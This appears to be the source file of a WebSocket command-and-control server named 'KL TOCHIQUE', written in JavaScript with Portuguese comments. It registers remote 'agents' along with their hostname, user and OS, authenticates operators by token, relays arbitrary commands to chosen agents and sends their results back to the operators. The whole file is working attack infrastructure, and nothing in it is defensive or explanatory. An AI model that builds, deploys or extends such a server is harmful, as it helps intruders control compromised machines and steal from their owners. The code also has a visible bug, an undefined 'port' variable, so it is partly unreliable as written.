/**
 * KL TOCHIQUE - C2 SERVER CORE (ESM VERSION)
 * Versão: 1.1.0
 * Compatível com: Railway / ES Modules
 */

import WebSocket from 'ws';
import { v4 as uuidv4 } from 'uuid';

// --- CONFIGURAÇÕES ---
const PORT = process.env.PORT || 8080;
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || "KL_SECRET_TOKEN_2024";

// --- ESTADO DO SERVIDOR ---
let agents = new Map(); 
let admins = new Set(); 

const wss = new WebSocket.Server({ port });

console.log(`[🚀] KL TOCHIQUE SERVER INICIADO (ESM MODE)`);
console.log(`[📡] Porta: ${PORT}`);
console.log(`[🔑] Token Admin: ${ADMIN_TOKEN}`);
console.log(`[🌐] Aguardando conexões...`);

// --- EVENTO PRINCIPAL ---
wss.on('connection', (ws, req) => {
    let currentRole = null; 
    let currentId = null;
    let connectionTime = new Date();

    // Log de debug para ajudar você a ver quem está conectando
    console.log(`[DEBUG] Nova tentativa de conexão detectada!`);

    ws.on('message', async (message) => {
        try {
            const data = JSON.parse(message);

            // 1. LÓGICA PARA AGENTES
            if (data.type === 'agent_ready' || data.type === 'agent_hello') {
                handleAgentConnection(ws, data);
                currentRole = 'agent';
                currentId = data.id;
            } 

            // 2. LÓGICA PARA ADMINISTRADORES (PAINEL WEB)
            else if (data.type === 'admin_login') {
                if (data.token === ADMIN_TOKEN) {
                    currentRole = 'admin';
                    admins.add(ws);
                    console.log(`[✅] Admin Conectado: ${data.label || 'Operador'}`);
                    ws.send(JSON.stringify({ type: 'admin_auth_ok' }));
                } else {
                    console.log(`[❌] Tentativa de login falha com token inválido.`);
                    ws.send(JSON.stringify({ type: 'error', message: 'Token Inválido' }));
                    ws.close();
                }
            }

            // 3. ROTEAMENTO DE COMANDOS (ADMIN -> AGENTE)
            else if (currentRole === 'admin' && data.type === 'command_request') {
                routeCommandToAgent(data);
            }

            // 4. ROTEAMENTO DE RESPOSTAS (AGENTE -> ADMIN)
            else if (currentRole === 'agent') {
                routeResponseToAdmins(currentId, data);
            }

        } catch (err) {
            console.error(`[⚠️] Erro ao processar mensagem: ${err.message}`);
        }
    });

    ws.on('close', () => {
        if (currentRole === 'agent') {
            agents.delete(currentId);
            console.log(`[[-] Agente Desconectado: ${currentId}`);
            broadcastToAdmins({ type: 'agent_offline', agentId: currentId });
        } else if (currentRole === 'admin') {
            admins.delete(ws);
            console.log(`[[-] Administrador Desconectado.`);
        }
    });

    ws.on('error', (err) => {
        console.error(`[!] Erro no socket: ${err.message}`);
    });
});

// --- FUNÇÕES DE SUPORTE ---

function handleAgentConnection(ws, data) {
    const agentId = data.id || uuidv4();
    agents.set(agentId, {
        socket: ws,
        info: {
            name: data.name || 'Unknown',
            user: data.user || 'Unknown',
            os: data.os || 'Unknown',
            connectedAt: new Date()
        }
    });

    console.log(`[+] Agente Registrado: ${data.name} (${data.user}) | ID: ${agentId}`);
    
    broadcastToAdmins({
        type: 'agent_online',
        agentId: agentId,
        info: data.info || data
    });
}

function routeCommandToAgent(data) {
    const { agentId, command, params } = data;
    const target = agents.get(agentId);

    if (target && target.socket.readyState === WebSocket.OPEN) {
        target.socket.send(JSON.stringify({
            type: command,
            ...params,
            timestamp: new Date()
        }));
        console.log(`[>] Comando [${command}] enviado para Agente: ${agentId}`);
    } else {
        console.log(`[!] Erro: Agente ${agentId} não encontrado ou offline.`);
    }
}

function routeResponseToAdmins(agentId, data) {
    broadcastToAdmins({
        type: data.type,
        agentId: agentId,
        payload: data.payload || data,
        timestamp: new Date()
    });
}

function broadcastToAdmins(msg) {
    const payload = JSON.stringify(msg);
    admins.forEach(adminWs => {
        if (adminWs.readyState === WebSocket.OPEN) {
            adminWs.send(payload);
        }
    });
}

// --- MONITORAMENTO ---
setInterval(() => {
    if (agents.size > 0) {
        console.log(`[📊] Status: ${agents.size} Agentes Online | ${admins.size} Admins Online`);
    }
}, 30000);

process.on('uncaughtException', (err) => {
    console.error(`[CRITICAL] ${err.message}`);
});

process.on('unhandledRejection', (reason) => {
    console.error(`[CRITICAL] Unhandled Rejection: ${reason}`);
});
